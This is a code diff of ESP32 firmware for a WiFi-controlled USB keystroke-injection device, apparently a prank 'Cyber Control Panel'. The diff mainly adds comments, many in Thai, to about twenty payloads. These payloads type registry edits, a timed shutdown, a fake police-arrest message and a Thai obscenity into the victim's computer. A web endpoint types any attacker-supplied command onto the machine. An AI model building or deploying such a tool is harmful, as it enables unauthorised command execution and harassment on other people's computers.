@@ -5,15 +5,18 @@
 #include <USB.h>
 #include <USBHIDKeyboard.h>
 
+// Default WiFi credentials
 const char* default_ssid = "MarkTV";
 const char* default_password = "subtomarktv";
 
+// Global variables
 String wifi_ssid = default_ssid;
 String wifi_password = default_password;
 WebServer server(80);
 Preferences preferences;
 USBHIDKeyboard Keyboard;
 
+// HTML and CSS with cyberpunk green theme (improved)
 const char* htmlContent = R"rawliteral(
 <!DOCTYPE html>
 <html lang="th">
@@ -236,7 +239,6 @@ const char* htmlContent = R"rawliteral(
         <div class="header">
             <h1 class="glitch">CYBER CONTROL PANEL</h1>
             <div class="credit">Create By MarkTV</div>
-            <div class="youtube.com/@MarkTV59</div>
         </div>
         
         <div class="config-panel">
@@ -365,14 +367,16 @@ const char* htmlContent = R"rawliteral(
 </html>
 )rawliteral";
 
+// Function to switch to English keyboard layout
 void switchToEnglishLayout() {
-
+  // Try different methods to switch to English layout
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_LEFT_SHIFT);
   delay(100);
   Keyboard.releaseAll();
   delay(500);
   
+  // Alternative method for some systems
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(KEY_SPACE);
   delay(100);
@@ -380,18 +384,19 @@ void switchToEnglishLayout() {
   delay(500);
 }
 
+// Function to execute payloads based on command ID
 void executePayload(int command) {
-
+  // Switch to English layout first
   switchToEnglishLayout();
   delay(1000);
   
   switch(command) {
-    case 1: 
+    case 1: // เปิดเสียงเต็ม 100%
       Keyboard.print("nircmd.exe setsysvolume 65535");
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 2: 
+    case 2: // พลิกหน้าจอ upside down
       Keyboard.press(KEY_LEFT_CTRL);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press(KEY_DOWN_ARROW);
@@ -399,7 +404,7 @@ void executePayload(int command) {
       Keyboard.releaseAll();
       break;
       
-    case 3: 
+    case 3: // เปิด Notepad พิมพ์ข้อความล้อเล่น
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -410,7 +415,7 @@ void executePayload(int command) {
       Keyboard.print("พ่อมึงตายไอไก่");
       break;
       
-    case 4:
+    case 4: // เปลี่ยน wallpaper เป็นสีดำ
       Keyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"\" /f");
       Keyboard.write(KEY_RETURN);
       delay(300);
@@ -418,7 +423,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 5:
+    case 5: // เปิด YouTube ซ่อนเบราว์เซอร์
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -427,12 +432,12 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 6:
+    case 6: // สลับปุ่มเมาส์ (ซ้าย-ขวา)
       Keyboard.print("reg add \"HKCU\\Control Panel\\Mouse\" /v SwapMouseButtons /t REG_SZ /d 1 /f");
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 7:
+    case 7: // เปิดเพลง Rick Roll
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -441,14 +446,14 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 8:
+    case 8: // ปิดการทำงานของแป้นพิมพ์ชั่วคราว
       Keyboard.print("pause");
       Keyboard.write(KEY_RETURN);
       delay(3000);
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 9:
+    case 9: // เปิด CMD พิมพ์ tree
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -457,7 +462,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 10:
+    case 10: // แสดงข้อความหลอกว่า Blue Screen
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -466,7 +471,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 11:
+    case 11: // เปิด Calculator เต็มหน้าจอ
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -482,13 +487,13 @@ void executePayload(int command) {
       Keyboard.releaseAll();
       break;
       
-    case 12:
+    case 12: // เปลี่ยนภาษาแป้นพิมพ์
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press(KEY_LEFT_SHIFT);
       Keyboard.releaseAll();
       break;
       
-    case 13:
+    case 13: // เปิดรูปภาพตลกๆ
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -497,7 +502,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 14:
+    case 14: // ทำให้เมาส์เคลื่อนที่แบบสุ่ม
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -506,11 +511,11 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 15:
+    case 15: // พิมพ์ข้อความยาวแบบสุ่ม
       Keyboard.print("เราตรวจพบ Digital Footprint ของคุณว่าแอบเข้าเว็บ SUS เจ้าหน้าที่กำลังเข้าไปจับกุมคุณ");
       break;
       
-    case 16:
+    case 16: // เปิดโปรแกรมทั้งหมดที่เปิดอยู่ซ้อนกัน
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press(KEY_TAB);
       Keyboard.releaseAll();
@@ -522,7 +527,7 @@ void executePayload(int command) {
       }
       break;
       
-    case 17:
+    case 17: // ทำให้หน้าจอกระพริบ
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -531,7 +536,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 18:
+    case 18: // เปิดเสียงสัตว์ร้องแบบสุ่ม
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -540,7 +545,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 19:
+    case 19: // เลียนแบบการแฮ็กในภาพยนตร์
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('r');
       Keyboard.releaseAll();
@@ -549,7 +554,7 @@ void executePayload(int command) {
       Keyboard.write(KEY_RETURN);
       break;
       
-    case 20:
+    case 20: // รีสตาร์ทคอมพิวเตอร์ (หลอก)
       Keyboard.print("shutdown /r /t 30 /c \"คอมพิวเตอร์ของคุณจะรีสตาร์ทใน 30 วินาที กรุณาบันทึกงานทั้งหมดของคุณ\"");
       Keyboard.write(KEY_RETURN);
       delay(10000);
@@ -567,26 +572,26 @@ void executePayload(int command) {
 void setup() {
   Serial.begin(115200);
   
-  
+  // Initialize USB and HID keyboard
   USB.begin();
   Keyboard.begin();
   
-
+  // Initialize preferences (non-volatile storage)
   preferences.begin("wifi-config", false);
   
-
+  // Try to get saved WiFi settings
   wifi_ssid = preferences.getString("ssid", default_ssid);
   wifi_password = preferences.getString("password", default_password);
   
-
+  // Set up WiFi in AP mode
   WiFi.softAP(wifi_ssid.c_str(), wifi_password.c_str());
   
-
+  // Set up mDNS for local domain
   if (!MDNS.begin("cybercontrol")) {
     Serial.println("Error setting up MDNS responder!");
   }
   
-
+  // Set up server routes
   server.on("/", HTTP_GET, []() {
     String page = htmlContent;
     page.replace("%SSID%", wifi_ssid);
@@ -607,11 +612,11 @@ void setup() {
   server.on("/payload", HTTP_POST, []() {
     if (server.hasArg("payload")) {
       String payload = server.arg("payload");
-
+      // Switch to English layout first
       switchToEnglishLayout();
       delay(1000);
       
-
+      // Type out the payload
       Keyboard.print(payload.c_str());
       Keyboard.write(KEY_RETURN);
       server.send(200, "text/plain", "Payload executed");
@@ -625,16 +630,16 @@ void setup() {
       wifi_ssid = server.arg("ssid");
       wifi_password = server.arg("password");
       
-
+      // Save to preferences
       preferences.putString("ssid", wifi_ssid);
       preferences.putString("password", wifi_password);
       
       server.send(200, "text/plain", "WiFi settings saved. Rebooting...");
       
-
+      // Delay to allow response to be sent
       delay(1000);
       
-
+      // Restart ESP to apply new WiFi settings
       ESP.restart();
     } else {
       server.send(400, "text/plain", "Missing SSID or password");
